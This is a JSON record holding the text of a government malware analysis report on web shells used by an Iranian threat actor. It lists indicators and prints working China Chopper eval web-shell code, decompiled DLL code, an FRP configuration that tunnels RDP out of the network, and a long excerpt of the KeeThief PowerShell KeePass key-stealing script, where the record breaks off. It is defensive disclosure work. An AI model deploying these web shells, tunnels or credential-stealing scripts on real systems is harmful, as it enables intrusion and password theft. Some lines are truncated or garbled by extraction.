{
    "id": "70480d6b-29f9-4f8f-bf55-4bc166f979c7",
    "created_at": "2023-01-12T15:04:18.158852Z",
    "updated_at": "2025-03-27T02:09:30.303966Z",
    "deleted_at": null,
    "sha1_hash": "01fdd7d431e109dab79fd8f74663c55c37090d52",
    "title": "2020-09-15 - Malware Analysis Report (AR20-259A)- Iranian Web Shells",
    "authors": "",
    "file_creation_date": "2022-05-29T01:05:25Z",
    "file_modification_date": "2022-05-29T01:05:25Z",
    "file_size": 386827,
    "plain_text": "# MAR-10297887-1.v2 – Iranian Web Shells\n\n**us-cert.cisa.gov/ncas/analysis-reports/ar20-259a**\n\n## Notification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of a\ninformation contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\n\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeab\naccordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distribu\nmore information on the Traffic Light Protocol (TLP), see http://www.us-cert.gov/tlp.\n\n## Summary\n\nDescription\n\nThe Iranian-based malicious cyber actor associated to this report is known to target industries associated to information technology, government\ninsurance across the US. The threat actor has been observed exploiting several publicly known Common Vulnerabilities and Exposures (CVEs)\nvirtual private network (VPN), Citrix NetScaler, and F5 vulnerabilities. Once the actor exploits these vulnerabilities, open source web shells and/o\nweb shells are used to further entrench into a victim network. The web shells are publicly known as ChunkyTuna, Tiny, and China Chopper web s\n\nThis product details the functionality of 18 malicious files including multiple components of the China Chopper web shell, including an application\napplication that listens for incoming Hypertext Transfer Protocol (HTTP) connections from a remote operator. The China Chopper web shell will a\nand execute JavaScript code on to a victim's system. The report also details additional China Chopper web shell components that allow the oper\ncommand and control (C2) capabilities including the ability to enumerate directories, upload and execute additional payloads, and exfiltrate data.\n\nIn addition, a program data (PDB) file and a binary, which has been identified as a compiled version of the open source project known as \"FRP\",\nallows an adversary to tunnel various types of connections to a remote operator sitting outside of the victim's network perimeter. In addition, a Po\nanalyzed that is part of the open source project known as \"KeeThief\". This code will allow the operator to access encrypted password credentials\n\"KeePass\" password management software.\n\nIt appears this adversary utilized these malicious tools to maintain persistent remote access and data exfiltration from the victim's network. The a\nthe \"FRP\" utility to tunnel outbound Remote Desktop Protocol (RDP) sessions, allowing persistent access to the network from outside the firewal\nChopper web shell also provides the persistent ability to navigate throughout the victim's network when inside the perimeter. Leveraging the \"Kee\nto sensitive user password credentials and potentially the ability to pivot to user accounts outside of the victim's network.\n\nAn additional 7 files contain malicious Hypertext Preprocessor (PHP) code designed to function as malicious web shells, which were identified as\nshells. The purpose of these web shells is to accept commands and data from a remote operator, providing the operator C2 capabilities over a co\nSubmitted Files (17)\n\n134ef25d48b8873514f84a0922ec9d835890bda16cc7648372e014c1f90a4e13 (site.aspx)\n\n17f5b6d74759620f14902a5cc8bba8753df8a17da33f4ea126b98c7e2427e79c (vti_cnf.aspx.33154034.compiled)\n\n28bc161df8406a6acf4b052a986e29ad1f60cbb19983fc17931983261b18d4ea (App_Web_tcnma5bs.pdb)\n\n2944ea7d0045a1d64f3584e5803cbf3a026bd0e22bdf2e4ba1d28c6ad9e57849 (prev_sh)\n\n3b14d5eafcdb9e90326cb4146979706c85a58be3fc4706779f0ae8d744d9e63c (content)\n\n4a1fc30ffeee48f213e256fa7bff77d8abd8acd81e3b2eb3b9c40bd3e2b04756 (content)\n\n51e9cadeab1b33260c4ccb2c63f5860a77dd58541d7fb0840ad52d0a1abedd21 (df5bd34799e200951fcce77c1c0b42...)\n\n547440bd037a149ac7ac58bc5aaa65d079537e7a87dc93bb92edf0de7648761c (df5bd34799e200951fcce77c1c0b42...)\n\n553f355f62c4419b808e078f3f71f401f187a9ac496b785e81fbf087e02dc13f (ui-bg.aspx)\n\n55b9264bc1f665acd94d922dd13522f48f2c88b02b587e50d5665b72855aa71c (svchost.exe)\n\n5e0457815554574ea74b8973fc6290bd1344aac06c1318606ea4650c21081f0a (App_Web_tcnma5bs.0.js)\n\n8c9aeedeea37ee88c84b170d9cd6c6d83581e3a57671be0ba19f2c8a17bd29f3 (content)\n\n913ee2b048093162ff54dca050024f07200cdeaf13ffd56c449acb9e6d5fbda0 (kee.ps1)\n\n99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc (App_Web_tcnma5bs.dll)\n\nb36288233531f7ac2e472a689ff99cb0f2ac8cba1b6ea975a9a80c1aa7f6a02a (tiny_webshell)\n\nb443032aa281440017d1dcc3ae0a70d1d30d4f2f2b3f064f95f285e243559249 (df5bd34799e200951fcce77c1c0b42...)\n\nf7ddf2651faf81d2d5fe699f81315bb2cf72bb14d74a1c891424c6afad544bde (dllhost.dll)\n\nAdditional Files (1)\n\n\n-----\n\n( )\n\n## Findings\n\n**553f355f62c4419b808e078f3f71f401f187a9ac496b785e81fbf087e02dc13f**\n\nTags\n\ntrojanwebshell\n\nDetails\n\n**Name** ui-bg.aspx\n\n**Size** 178 bytes\n\n**Type** ASCII text, with no line terminators\n\n**MD5** d7b7a8c120b69166643ee05bf70b37e5\n\n**SHA1** 2ac99374cab70f8be83c48bbf3258eae78676f65\n\n**SHA256** 553f355f62c4419b808e078f3f71f401f187a9ac496b785e81fbf087e02dc13f\n\n**SHA512** 8c51c9e3d3d39ec7b961482ed7fc8cde1804ef126b72fce270c6891f64f4371067a65a8be1cbab1ab3c8860a3e2ea206d274f064d54cf2\n\n**ssdeep** 3:aEwJkW9uck1SLxAdRLgyKBM2aBZBQ/tZ/LmKABXXKF2xKYA5eRtGnKRHBIwLWEDp:aEm7EnLgyKBM5Y/tZ6KCHKF2xKt5e/GY\n\n**Entropy** 5.196436\n\nAntivirus\n\n**ESET** ASP/Webshell.T trojan\n\n**Sophos** Troj/WebShel-F\n\n**Symantec** Hacktool.Jsprat\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file is a small JavaScript file, which contains the following code:\n\n—Begin JavaScript Code—\n@ Page Language=\"Jscript\"%><%try\n{\neval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item[\"[Redacted]\"])),\"unsafe\");\n}\ncatch(e)\n{\n}\n—End JavaScript Code—\n\nAnalysis indicates this file might serve as part of a larger application. The code within the file decodes and executes data using the JavaScript \"e\nattained via the JavaScript \"Request\" function indicating the data is pulled from a remote server using the HTTP protocol. It is believed this script\nChina Chopper web shell framework.\n**134ef25d48b8873514f84a0922ec9d835890bda16cc7648372e014c1f90a4e13**\n\nTags\n\ntrojanwebshell\n\nDetails\n\n**Name** site.aspx\n\n**Size** 178 bytes\n\n**Type** ASCII text, with no line terminators\n\n**MD5** 20d89fa1df155632fafb2c9fe1a6a038\n\n**SHA1** c9cf494475de81dae5a2c54c678b4a518f46b1fe\n\n\n-----\n\n**SHA256** 134ef25d48b8873514f84a0922ec9d835890bda16cc7648372e014c1f90a4e13\n\n**SHA512** c1d485e34153c50af79e719c4100b988ba4d289578d385d0b30d2225c20b4b8f715d215f609a141030489a337ff36a89b23d4e99bf189\n\n**ssdeep** 3:aEwJkW9uck1SLxAdRLgyKBM2aBZBQ/tZ/LmKABXXKF2xKYA5eRtJIIDYbwLWEDvR:aEm7EnLgyKBM5Y/tZ6KCHKF2xKt5e/f3\n\n**Entropy** 5.201321\n\nAntivirus\n\n**ESET** ASP/Webshell.T trojan\n\n**Sophos** Troj/WebShel-F\n\n**Symantec** Hacktool.Jsprat\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file is a small JavaScript file, which contains the following embedded code:\n\n—Begin Embedded JavaScript—\nPage Language=\"Jscript\"%><%try\n{\neval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item[\"ammashnist\"])),\"unsafe\");\n}\ncatch(e)\n{\n}\n—End Embedded JavaScript—\n\nThis script is designed to pull JavaScript from an existing \"Request Object\", Base64 decode and execute it. The contents of the retrieved JavaSc\nfor analysis. It is believed this web shell is a component of the China Chopper web shell framework.\n**17f5b6d74759620f14902a5cc8bba8753df8a17da33f4ea126b98c7e2427e79c**\n\nTags\n\nwebshell\n\nDetails\n\n**Name** vti_cnf.aspx.33154034.compiled\n\n**Size** 408 bytes\n\n**Type** XML 1.0 document, UTF-8 Unicode (with BOM) text, with CRLF line terminators\n\n**MD5** de1cd1c54711544508d157214323af85\n\n**SHA1** c33a07965e06280c53e19a5d093983205433843f\n\n**SHA256** 17f5b6d74759620f14902a5cc8bba8753df8a17da33f4ea126b98c7e2427e79c\n\n**SHA512** 8265901a684f808c612f9cfcc486aaba923e2cf8ca7fdcd3071e786ad6030c067c4147b7b4e36bb271a5f2b36e0c3f487ceb259e2f00e6\n\n**ssdeep** 12:MMHdWFV2q6sX1rMxA0UH17I2fUQ/1OifV2q6sW6/1:JdmsvkrGOnfUcBsve/1\n\n**Entropy** 5.120655\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\n\n-----\n\np g g p pp g g\nexecution of a China Chopper web shell application. Although this file cannot be executed, its presence may be considered an indicator of comp\nfollowing data.\n\n—Begin Data—\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<preserve resultType=\"3\" virtualPath=\"/rfq/aspnet_client/system_web/4_0_30319/_vti_cnf.aspx\" hash=\"825a58a8b\" filehash=\"445bd1a9fe00\" fla\nassembly=\"App_Web_tcnma5bs\" type=\"ASP.aspnet_client_system_web_4_0_30319__vti_cnf_aspx\">\n<filedeps>\n<filedep name=\"/rfq/aspnet_client/system_web/4_0_30319/_vti_cnf.aspx\" />\n</filedeps>\n</preserve>\n—End Data—\n**5e0457815554574ea74b8973fc6290bd1344aac06c1318606ea4650c21081f0a**\n\nTags\n\nwebshell\n\nDetails\n\n**Name** App_Web_tcnma5bs.0.js\n\n**Size** 8401 bytes\n\n**Type** UTF-8 Unicode (with BOM) text, with CRLF line terminators\n\n**MD5** 8495abfd7356f75ad7006d2ab42d4bee\n\n**SHA1** 3736a085f9fe515dc7d12bbf2a1474bdd3d8d4d2\n\n**SHA256** 5e0457815554574ea74b8973fc6290bd1344aac06c1318606ea4650c21081f0a\n\n**SHA512** 8c5fec8455ad0d529030f19626b8fe55b05f6f24b4fee1378e2d6ffa7185c5f2854074cfc30518721892f39985dc5742e81f875d54691019\n\n**ssdeep** 192:VkjEVXTaaVEDAQpovRpY0NHMdWoEsxpKL:VkjEVXTaaEDAQM3NHMdJEIp4\n\n**Entropy** 5.246768\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis application has been identified as a component of a malicious web shell. This script has been tentatively identified as a variant of the China\nDisplayed below is the partial JavaScript application extracted from this script:\n\n—Begin Partial JavaScript—\npackage ASP {\n\npublic System.Runtime.CompilerServices.CompilerGlobalScopeAttribute()\nclass aspnet_client_system_web_4_0_30319__vti_cnf_aspx extends System.Web.UI.Page implements System.Web.SessionState.IRequiresS\nSystem.Web.IHttpHandler {\n\nprivate static var __initialized : boolean;\n\nprivate static var __fileDependencies : System.Object;\n\npublic System.Diagnostics.DebuggerNonUserCodeAttribute() function aspnet_client_system_web_4_0_30319__vti_cnf_aspx() {\nvar dependencies : System.String[];\nSystem.Web.UI.Page(this).AppRelativeVirtualPath = \"~/aspnet_client/system_web/4_0_30319/_vti_cnf.aspx\";\nif ((ASP.aspnet_client_system_web_4_0_30319__vti_cnf_aspx.__initialized == false)) {\ndependencies = new System.String[1];\ndependencies[0] = \"~/aspnet_client/system_web/4_0_30319/_vti_cnf.aspx\";\n\n\n-----\n\np _ _ y _ _ _ _ __ _ _ p __ p pp p ( p );\nASP.aspnet_client_system_web_4_0_30319__vti_cnf_aspx.__initialized = true;\n}\nthis.Server.ScriptTimeout = 30000000;\n\n}\n\nprotected final function get Profile() : System.Web.Profile.DefaultProfile {\nreturn System.Web.Profile.DefaultProfile(this.Context.Profile);\n}\n\nprotected override function get SupportAutoEvents() : boolean {\nreturn false;\n}\n\nprotected final function get ApplicationInstance() : ASP.global_asax {\nreturn ASP.global_asax(this.Context.ApplicationInstance);\n}\n\nprivate final System.Diagnostics.DebuggerNonUserCodeAttribute() function __BuildControlTree(__ctrl : aspnet_client_system_web_4_0_30\n\n//@cc_on\n//@set @position(file=\"F:\\\\inetpub\\\\wwwroot\\\\\\\\aspnet_client\\\\system_web\\\\4_0_30319\\\\_vti_cnf.aspx\";line=1)\nthis.InitializeCulture();\n\n//@set @position(end)\n__ctrl.SetRenderMethodDelegate(System.Web.UI.RenderMethod(this.__Render__control1));\n}\n\nprivate final function __Render__control1(__w : System.Web.UI.HtmlTextWriter, parameterContainer : System.Web.UI.Control) {\n\n//@cc_on\n//@set @position(file=\"F:\\\\inetpub\\\\wwwroot\\\\\\\\aspnet_client\\\\system_web\\\\4_0_30319\\\\_vti_cnf.aspx\";line=1)\ntry {eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item[\"[Redacted]\"\n\n//@set @position(end)\n}\n—End Partial JavaScript—\n\nAnalysis indicates it is designed to operate as a web server and accept JavaScript code provided from a remote operator. The password utilized\naccess this web shell was redacted.\n**99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc**\n\nTags\n\nwebshell\n\nDetails\n\n**Name** App_Web_tcnma5bs.dll\n\n**Size** 13312 bytes\n\n**Type** PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n**MD5** 18f2cf11b940a62d63fd757e20564ec6\n\n**SHA1** 6fbd38aff374974c59ccca7efd8e1a3205c69ce9\n\n**SHA256** 99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc\n\n\n-----\n\n**SHA512** 190c3cb0a09ce111135d0a98d10922650c28eb895583d98b2015b67e71a2131f824863cb4402d7627648aa0660ad5eaab63ed7cae8a\n\n**ssdeep** 384:4PojaxtaTXMzS/X44tIItLzxqIj3tccsJY5Ohmqw/4JHuNkLpe+k:4PojaxyXM+/X44K2\n\n**Entropy** 5.143850\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nPE Metadata\n\n**Compile Date** 2020-06-07 06:21:21-04:00\n\n**Import Hash** dae02f32a21e03ce65412f6e56942daa\n\n**Company Name**\n\n**File Description**\n\n**Internal Name** App_Web_tcnma5bs.dll\n\n**Legal Copyright**\n\n**Original Filename** App_Web_tcnma5bs.dll\n\n**Product Name**\n\n**Product Version**\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\n83b4ba5ffed3f61f2c3c07cbfb9e4645 header 512 2.606561\n\n9f9a21c74d71b03386ee22a566a1170d .text 11264 5.517535\n\ncb5b712bb6ddf459a6a953c98373b5f6 .rsrc 1024 2.512896\n\ndbd0e57bcdedc0733290c5195a01ad35 .reloc 512 0.081539\n\nPackers/Compilers/Cryptors\n\nMicrosoft Visual C# v7.0 / Basic .NET\n\nRelationships\n\n99344d862e... Related_To 28bc161df8406a6acf4b052a986e29ad1f60cbb19983fc17931983261b18d4ea\n\nDescription\n\nThis file is a Windows compiled .NET dynamic link library (DLL) file. It has been identified as a component of a malicious web shell. The DLL has\nas a variant of the China Chopper web shell. This malicious DLL contains embedded malicious JavaScript code. A portion of the JavaScript code\ndecompiled DLL is displayed below:\n\n—Begin Extracted Code—\nprivate void __Render__control1(HtmlTextWriter __w, Control parameterContainer)\n{\n// ISSUE: type reference\n// ISSUE: type reference\n// ISSUE: type reference\nMicrosoft.JScript.StackFrame.PushStackFrameForMethod((object) this, new JSLocalField[3]\n{\nnew JSLocalField(nameof (__w), __typeref (HtmlTextWriter), 0),\nnew JSLocalField(nameof (parameterContainer), __typeref (Control), 1),\nnew JSLocalField(\"e:6\", __typeref (object), 2)\n\n\n-----\n\n}, (( g ) ) g ());\ntry\n{\nobject obj1;\ntry\n{\nobject[] localVars1 = ((Microsoft.JScript.StackFrame) ((INeedEngine) this).GetEngine().ScriptObjectStackTop()).localVars;\nlocalVars1[0] = (object) __w;\nlocalVars1[1] = (object) parameterContainer;\nobject obj2;\nlocalVars1[2] = obj2;\nEval.JScriptEvaluate((object) Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(this.Request[\"[Redacted]\"])), ((I\nthis).GetEngine());\nobject[] localVars2 = ((Microsoft.JScript.StackFrame) ((INeedEngine) this).GetEngine().ScriptObjectStackTop()).localVars;\n__w = (HtmlTextWriter) localVars2[0];\nparameterContainer = (Control) localVars2[1];\nobj1 = localVars2[2];\n}\ncatch (Exception ex)\n{\nVsaEngine engine = ((INeedEngine) this).GetEngine();\nobj1 = Try.JScriptExceptionValue((object) ex, engine);\n}\nobject[] localVars = ((Microsoft.JScript.StackFrame) ((INeedEngine) this).GetEngine().ScriptObjectStackTop()).localVars;\nlocalVars[0] = (object) __w;\nlocalVars[1] = (object) parameterContainer;\nlocalVars[2] = obj1;\n}\nfinally\n{\n((INeedEngine) this).GetEngine().PopScriptObject();\n}\n—End Extracted Code—\n\nAnalysis indicates the password utilized to access this web shell by the remote actor was redacted. This implant will allow a remote operator to e\non a victim's system.\n**28bc161df8406a6acf4b052a986e29ad1f60cbb19983fc17931983261b18d4ea**\n\nTags\n\nwebshell\n\nDetails\n\n**Name** App_Web_tcnma5bs.pdb\n\n**Size** 24064 bytes\n\n**Type** MSVC program database ver 7.00, 512*47 bytes\n\n**MD5** 3be9b7030389ad5e106f169fbe7b7458\n\n**SHA1** 224448b5840b71ca07c144d3f525b8971c17d4a7\n\n**SHA256** 28bc161df8406a6acf4b052a986e29ad1f60cbb19983fc17931983261b18d4ea\n\n**SHA512** bf8b7bc82be4803099cfe956edb2699c441705955e4d7e3822501940a8e572dafcf1906c797cea8551f3407059bad03c9196bd143203\n\n**ssdeep** 384:ihIBU3Xo3Z3oTTi3aljxTi3aljKITi3aljs8Ti3aljUTi3aljBTi3alj1Ti3aljb:ihIBU4Zox1fLOx5H1bX0b6UW\n\n**Entropy** 3.924351\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\n28bc161df8... Related_To 99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc\n\nDescription\n\n\n-----\n\np g ( ) p pp pp_ _\n(99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc). Although this file cannot be executed, its presence may be con\ncompromise. Strings of interest extracted from this PDB life are displayed below:\n\n—Begin Strings of Interest—\nF:\\inetpub\\wwwroot\\\\aspnet_client\\system_web\\4_0_30319\\_vti_cnf.aspx\nf:\\inetpub\\wwwroot\\\\aspnet_client\\system_web\\4_0_30319\\_vti_cnf.aspx\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\nc:\\windows\\microsoft.net\\framework64\\v4.0.30319\\config\\web.config\n\n.ctor\nGlobal Code\nSystem\nSystem.Collections\nSystem.Text\nSystem.Web.UI\nSystem.Collections.Generic\nSystem.Text.RegularExpressions\nSystem.Xml.Linq\nSystem.Web.SessionState\nSystem.Web.Helpers\nSystem.Web.Routing\nSystem.Configuration\nSystem.Collections.Specialized\nSystem.Linq\nSystem.Web\nSystem.Web.DynamicData\nSystem.Web.Caching\nSystem.Web.Profile\nSystem.ComponentModel.DataAnnotations\nSystem.Web.UI.WebControls\nSystem.Web.Mvc.Ajax\nSystem.Web.Security\nSystem.Web.Mvc\nSystem.Web.UI.WebControls.WebParts\nSystem.Web.WebPages\nSystem.Web.Mvc.Html\nSystem.Web.UI.HtmlControls\nget_Profile\nASP\nSystem\nSystem.Collections\nSystem.Text\nSystem.Web.UI\nSystem.Collections.Generic\nSystem.Text.RegularExpressions\nSystem.Xml.Linq\nSystem.Web.SessionState\nSystem.Web.Helpers\nSystem.Web.Routing\nSystem.Configuration\nSystem.Collections.Specialized\nSystem.Linq\nSystem.Web\nSystem.Web.DynamicData\nSystem.Web.Caching\nSystem.Web.Profile\nSystem.ComponentModel.DataAnnotations\nSystem.Web.UI.WebControls\nSystem.Web.Mvc.Ajax\nSystem.Web.Security\nSystem.Web.Mvc\nSystem.Web.UI.WebControls.WebParts\nSystem.Web.WebPages\nSystem.Web.Mvc.Html\nSystem.Web.UI.HtmlControls\nget_SupportAutoEvents\n\nGetEngine\n0600000d\nSetEngine\n0600000e\nASP.aspnet_client_system_web_4_0_30319__vti_cnf_aspx\n87986BFE\n__ASP.FastObjectFactory_app_web_tcnma5bs\n35A8BE76\nJScript 0\n\n\n-----\n\nJScript 1\n062A2591\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\nF:\\inetpub\\wwwroot\\\\aspnet_client\\system_web\\4_0_30319\\_vti_cnf.aspx\nT[@\n/LinkInfo\n/names\n/src/headerblock\n/src/files/f:\\inetpub\\wwwroot\\\\aspnet_client\\system_web\\4_0_30319\\_vti_cnf.aspx\n/src/files/c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\config\\web.config\n—End Strings of Interest—\n**55b9264bc1f665acd94d922dd13522f48f2c88b02b587e50d5665b72855aa71c**\n\nTags\n\nproxywebshell\n\nDetails\n\n**Name** svchost.exe\n\n**Size** 10532864 bytes\n\n**Type** PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows\n\n**MD5** c8bc262d7126c3399baaec3bee89d542\n\n**SHA1** c94a0f902b3b8cc4ca5e4cc9004ac9eaa4614699\n\n**SHA256** 55b9264bc1f665acd94d922dd13522f48f2c88b02b587e50d5665b72855aa71c\n\n**SHA512** cf7b89d9658e618cb4f590b13bd6a6e5abcba0cddca625c7aeaaafb5ef8821a7a60620b789de4abd5d4505ffe3e9c13ad3bf1173f21e17\n\n**ssdeep** 196608:3YHvhq3/BuNnKkOeXtqugiGk9FPHxgc/uA63+w0IUX:kQBuVku1G+\n\n**Entropy** 6.107183\n\nAntivirus\n\n**K7** Riskware ( 0040eff71 )\n\n**Sophos** App/FRProxy-A\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nPE Metadata\n\n**Compile Date** 1969-12-31 19:00:00-05:00\n\n**Import Hash** 91802a615b3a5c4bcc05bc5f66a5b219\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\n86ff3a53ecd56eaa856f8c7c28d0a8f1 header 1536 1.263684\n\n26ef590b60778bfdd9bfcbb24d832f94 .text 4546560 5.826487\n\nabdb24e1a410aa5fba49a4d1fe6a21bb .rdata 5612032 5.660454\n\n2e993dbff4bcb21d52aa1897a4e2604e .data 370688 6.023192\n\nf006061c21d3eee457ffe5e2c69cba8e .idata 1536 3.442601\n\n07b5472d347d42780469fb2654b7fc54 .symtab 512 0.020393\n\nDescription\n\n\n-----\n\np p y, y p\nTranslation, to provide network access to systems / operators located outside of the victim's network. For example, the utility could be utilized to\nprotocol connections from an inside system protected by a firewall and router, to a system outside of the firewall perimeter.\n\n**f7ddf2651faf81d2d5fe699f81315bb2cf72bb14d74a1c891424c6afad544bde**\n\nTags\n\nwebshell\n\nDetails\n\n**Name** dllhost.dll\n\n**Size** 226 bytes\n\n**Type** ASCII text, with CRLF line terminators\n\n**MD5** 14df2e509b6ee8deb3ce6ba3b88e3de0\n\n**SHA1** 80190bdddf70a79a1735136f81309219c937458d\n\n**SHA256** f7ddf2651faf81d2d5fe699f81315bb2cf72bb14d74a1c891424c6afad544bde\n\n**SHA512** 6a32f2715d554c11eb0a50e39540c9e68bbb387b8a3aa1dfe4604ce6ed22a075fae0c1b3dfd07468746f4d782b1bff203f9036acaff9d6b\n\n**ssdeep** 6:eBh3BnEWovv5O4WaundbHAVSVDOUqxTWi:enlcO4WhcSVHqxii\n\n**Entropy** 5.081345\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file is a configuration file, which may be utilized with the FRP binary named \"svchost.exe\"\n(55b9264bc1f665acd94d922dd13522f48f2c88b02b587e50d5665b72855aa71c). The contents of the configuration file is displayed below:\n\n—Begin Configuration Data—\n\n[common]\nserver_addr = [IP address]\nserver_port = 443\ntls_enable = true\ntoken = laksddflko986wq35029735\n\n[Indy [SCCPV01] - RDP]\ntype = tcp\nuse_encryption = true\nlocal_ip = [IP address]\nlocal_port = 3389\nremote_port = 0\n—End Configuration Data—\n\nThe protocol tunneled is RDP.\n**913ee2b048093162ff54dca050024f07200cdeaf13ffd56c449acb9e6d5fbda0**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** kee.ps1\n\n**Size** 357631 bytes\n\n**Type** awk or perl script, ASCII text, with very long lines\n\n**MD5** 3a83cad860a688e1f40683142280a67b\n\n**SHA1** d8ad2de372296501c3eb3aa0e053708eb3914113\n\n\n-----\n\n**SHA256** 913ee2b048093162ff54dca050024f07200cdeaf13ffd56c449acb9e6d5fbda0\n\n**SHA512** a7afad9c446e55e25ec6289595ebeba469df0ccbc1863c437acf64e63c13b497699804de5248664d5cb78c527ffb9d1415c36a182d320\n\n**ssdeep** 6144:SJU/ny0KiejKvsM7fz0QVd/eHuwF1U1zDtyftQQKasiaUKGY4RpmOHYqmqEqJ7jO:sIyCVjz0QpcU9QlTsZb\n\n**Entropy** 6.018326\n\nAntivirus\n\n**BitDefender** Application.Hacktool.TJ\n\n**Cyren** Trojan.NBMZ-8\n\n**ESET** MSIL/PSW.KeeThief.A trojan\n\n**Ikarus** Trojan.PowerShell.Pklotide\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\n913ee2b048... Related_To 10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334\n\nDescription\n\nThis file is a malicious PowerShell script. It is part of an open source application. The purpose of this script is to decrypt \"keepass\" files in an atte\npassword credentials stored on the victim's system. During runtime, this script decodes and utilizes the .NET executable named \"KeeTheft.dll,\"\n(10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334). A portion of the PowerShell script is displayed below:\n\n—Begin Malicious Powershell Code—\n#requires -version 2\nfunction Get-KP\n{\n\n[CmdletBinding()]\nparam (\n\n[Parameter(Position = 0,\nValueFromPipeline = $True)]\n\n[System.Diagnostics.Process[]]\n\n[ValidateNotNullOrEmpty()]\n$Process\n)\nBEGIN\n{\nif(-not $PSBoundParameters['Process'])\n{\ntry\n{\n$Process = Get-Process KeePass -ErrorAction Stop | Where-Object\n{\n$_.FileVersion -match '^2\\.'\n}\n}\ncatch\n{\nthrow 'NO instances open!'\n}\n}\n$EncodedCompressedFile = 'tL0HfFzFET/+7'\n$DeflatedStream = New-Object\nIO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),\n[IO.Compression.CompressionMode]::Decompress)\n$UncompressedFileBytes = New-Object Byte[](738304)\n$DeflatedStream.Read($UncompressedFileBytes, 0, 738304) | Out-Null\n$Assembly =\n[Reflection.Assembly]::Load($UncompressedFileBytes)\n}\nPROCESS\n{\nForEach($KeePassProcess in\n$Process)\n\n\n-----\n\n{\nif($KeePassProcess.FileVersion -match '^2\\.')\n{\n$WMIProcess = GetWmiObject win32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"\n$ExecutablePath =\n$WMIProcess | Select-Object -Expand ExecutablePath\nWrite-Verbose \"Examining KeePass\nprocess $($KeePassProcess.ID) for master keys\"\n$Keys = $Assembly.GetType\n('KeeTheft.Program').GetMethod('GetKeePassMasterKeys').Invoke($null, @\n([System.Diagnostics.Process]$KeePassProcess))\nif($Keys)\n{\nForEach\n($Key in $Keys)\n{\nForEach($UserKey in $Key.UserKeys)\n{\n$KeyType = $UserKey.GetType().Name\n$UserKeyObject = New-Object PSObject\n$UserKeyObject | Add-Member Noteproperty 'Database' $UserKey.databaseLocation\n$UserKeyObject | Add-Member Noteproperty 'KeyType' $KeyType\n$UserKeyObject | Add-Member Noteproperty 'KeePassVersion' $KeePassProcess.FileVersion\n$UserKeyObject | Add-Member Noteproperty 'ProcessID' $KeePassProcess.ID\n$UserKeyObject | Add-Member Noteproperty 'ExecutablePath' $ExecutablePath\n$UserKeyObject | Add-Member Noteproperty 'EncryptedBlobAddress' $UserKey.encryptedBlobAddress\n$UserKeyObject | Add-Member Noteproperty 'EncryptedBlob' $UserKey.encryptedBlob\n$UserKeyObject | Add-Member Noteproperty 'EncryptedBlobLen' $UserKey.encryptedBlobLen\n$UserKeyObject | Add-Member Noteproperty 'PlaintextBlob' $UserKey.plaintextBlob\nif($KeyType -eq 'KcpPassword')\n{\n$Plaintext =\n[System.Text.Encoding]::UTF8.GetString($UserKey.plaintextBlob)\n}\nelse\n{\n$Plaintext = [Convert]::ToBase64String\n($UserKey.plaintextBlob)\n}\n$UserKeyObject | AddMember Noteproperty 'Plaintext' $Plaintext\nif($KeyType -eq 'KcpUserAccount')\n{\ntry\n{\n$WMIProcess = Get-WmiObject\nwin32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"\n$UserName =\n$WMIProcess.GetOwner().User\n$ProtectedUserKeyPath = Resolve-Path -Path\n\"$($Env:WinDir | Split-Path -Qualifier)\\Users\\*$UserName*\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin\"\n-ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path\n$UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $ProtectedUserKeyPath\n}\ncatch\n{\nWrite-Warning \"Error\nenumerating the owner of $($KeePassProcess.ID) : $_\"\n}\n}\nelse\n{\n$UserKeyObject | 